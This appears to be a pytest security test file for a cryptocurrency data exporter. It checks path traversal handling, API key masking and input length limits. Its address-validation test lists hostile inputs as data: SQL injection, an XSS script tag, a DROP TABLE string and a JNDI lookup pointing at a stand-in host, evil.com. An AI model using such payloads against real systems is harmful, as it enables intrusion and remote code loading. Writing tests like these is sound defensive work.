import pytest
import os
from src.exporters.csv_exporter import CSVExporter
from src.utils.validators import AddressValidator
from src.exceptions.custom_exceptions import ValidationError

class TestSecurity:
    """Security and input sanitization tests"""

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        malicious_path = "../../../etc/passwd"

        exporter = CSVExporter(output_directory="./output")

        filename = exporter._generate_filename(malicious_path, include_timestamp=False)

        # Should not contain path traversal elements
        assert "/" not in os.path.basename(filename)
        assert "\\" not in os.path.basename(filename)

    def test_address_injection_prevention(self):
        """Test prevention of address injection attacks"""
        malicious_addresses = [
            "0x' OR 1=1 --",
            "0x<script>alert('xss')</script>",
            "0x${jndi:ldap://evil.com/a}",
            "'; DROP TABLE users; --",
        ]

        for address in malicious_addresses:
            assert not AddressValidator.is_valid_ethereum_address(address)

    def test_api_key_exposure_prevention(self):
        """Test that API keys are not logged or exposed"""
        from src.api.etherscan_client import EtherscanClient
        from src.utils.rate_limiter import RateLimiter

        sensitive_api_key = "secret_api_key_12345"
        client = EtherscanClient(sensitive_api_key, RateLimiter())

        # API key should not appear in __repr__ or str()
        client_str = repr(client)
        assert sensitive_api_key not in client_str

        client_str2 = str(client)
        assert sensitive_api_key not in client_str2

    def test_input_size_limits(self):
        """Test handling of extremely large inputs"""
        # Very long address (should be rejected)
        long_address = "0x" + "a" * 1000
        assert not AddressValidator.is_valid_ethereum_address(long_address)

        # Very long transaction hash
        from src.utils.validators import TransactionValidator

        long_hash = "0x" + "a" * 1000
        assert not TransactionValidator.is_valid_transaction_hash(long_hash)
